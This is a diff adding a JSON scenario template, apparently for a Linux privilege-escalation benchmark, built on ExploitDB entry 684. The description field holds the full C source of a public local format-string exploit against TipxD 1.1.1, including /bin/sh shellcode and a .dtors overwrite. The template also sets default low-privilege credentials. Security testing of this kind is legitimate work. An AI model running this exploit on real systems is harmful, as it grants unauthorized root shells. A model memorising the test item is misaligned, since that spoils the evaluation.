@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_684",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: TipxD 1.1.1 - Not SETUID Local Format String (OSVDB-12346)\n\nExploit source code (684.c):\n```\n/* tipxd_exp.c\n\nTipxD Format String Vulnerability\n\nTipxD <= 1.1.1 local exploit (Proof of Concept)\n\nTested in Slackware 9.0 / 9.1 / 10.0\n\nby CoKi <coki@nosystem.com.ar> - SECU\nNo System Group - http://www.nosystem.com.ar\n*/\n\n#include <stdio.h>\n#include <string.h>\n\n#define PATH \"/bin/tipxd\"\n#define OBJDUMP \"/usr/bin/objdump\"\n#define GREP \"/usr/bin/grep\"\n\nunsigned char shellcode[]= /* aleph1 shellcode.45b */\n\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\"\n\"\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\"\n\"\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\"\n\"\\x2f\\x73\\x68\";\n\nint check(unsigned long addr);\n\nint main(int argc, char *argv[]) {\n\nint i, dtorsaddr;\nunsigned int bal1, bal2, bal3, bal4;\nchar temp[512];\nchar buffer[1024];\nchar nop1[255], nop2[255];\nchar nop3[255], nop4[255];\nint cn1, cn2, cn3, cn4;\nFILE *f;\nchar *env[3] = {shellcode, NULL};\nint shaddr = 0xbffffffa - strlen(shellcode) - strlen(PATH);\n\n/* finding .dtors address */\nsprintf(temp, \"%s -s -j .dtors %s | %s ffffffff\", OBJDUMP, PATH, GREP);\nf = popen(temp, \"r\");\nif(fscanf(f, \" %08x\", &dtorsaddr) != 1) {\npclose(f);\nprintf(\"Cannot find .dtors address\\n\");\nexit(1);\n}\npclose(f);\ndtorsaddr = dtorsaddr + 4;\n\nprintf(\"\\n TipxD <= 1.1.1 local exploit (Proof of Concept)\\n\");\nprintf(\" by CoKi <coki@nosystem.com.ar>\\n\\n\");\nprintf(\" shellcode address = %.8p\\n\", shaddr);\nprintf(\" .dtors address = %.8p\\n\\n\", dtorsaddr);\n\nbzero(temp, sizeof(temp));\nbzero(buffer, sizeof(buffer));\n\nstrcat(buffer, \"x\");\n\n/* adding .dtors address */\nfor(i = 0; i < 4; i++) {\nbzero(temp, sizeof(temp));\nsprintf(temp, \"%s\", &dtorsaddr);\nstrncat(buffer, temp, 4);\ndtorsaddr++;\n}\n\n/* convert shellcode address location */\nmemset(nop1, 0, 255);\nmemset(nop2, 0, 255);\nmemset(nop3, 0, 255);\nmemset(nop4, 0, 255);\n\nbal1 = (shaddr & 0xff000000) >> 24;\nbal2 = (shaddr & 0x00ff0000) >> 16;\nbal3 = (shaddr & 0x0000ff00) >> 8;\nbal4 = (shaddr & 0x000000ff);\n\ncn1 = bal4 - 16 - 15 - 48 - 2 -1;\ncn1 = check(cn1);\ncn2 = bal3 - bal4 - 2;\ncn2 = check(cn2);\ncn3 = bal2 - bal3 - 2;\ncn3 = check(cn3);\ncn4 = bal1 - bal2 - 2;\ncn4 = check(cn4);\n\nmemset(nop1, '\\x90', cn1);\nmemset(nop2, '\\x90', cn2);\nmemset(nop3, '\\x90', cn3);\nmemset(nop4, '\\x90', cn4);\n\nsprintf(temp, \"%%08x%%08x%%08x%%08x%%08x%%08x\"\n\"%s\\xeb\\x02%%n\"\n\"%s\\xeb\\x02%%n\"\n\"%s\\xeb\\x02%%n\"\n\"%s\\xeb\\x02%%n\\x90\\x90\\x90\\x90\"\n,nop1, nop2, nop3, nop4);\n\nstrcat(buffer, temp);\n\nexecle(PATH, \"tipxd\", \"-f\", buffer, NULL, env);\n}\n\nint check(unsigned long addr) {\nchar tmp[128];\nsnprintf(tmp, sizeof(tmp), \"%d\", addr);\nif(atoi(tmp) < 1)\naddr = addr + 256;\n\nreturn addr;\n}\n\n// milw0rm.com [2004-12-14]\n```",
+  "cve": "OSVDB-12346",
+  "exploitdb_id": "684",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_684",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
